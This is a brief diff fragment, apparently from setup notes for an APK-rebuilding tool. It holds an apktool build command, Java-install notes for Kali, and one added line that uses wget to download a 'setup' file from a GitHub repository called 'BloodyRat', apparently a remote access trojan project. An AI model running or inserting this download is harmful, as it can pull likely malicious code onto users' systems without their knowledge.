@@ -7,3 +7,5 @@ exports.buildCommand = 'java -jar "' + exports.apkTool + '" b "' + exports.smali
 if os is kali then we need to add repo install java 8 or else sudo apt install openjdk-8-jre-headless
 
 cat /etc/issue | awk '{print $1}'
+
+wget -N https://github.com/Bhaviktutorials/BloodyRat/raw/main/setup
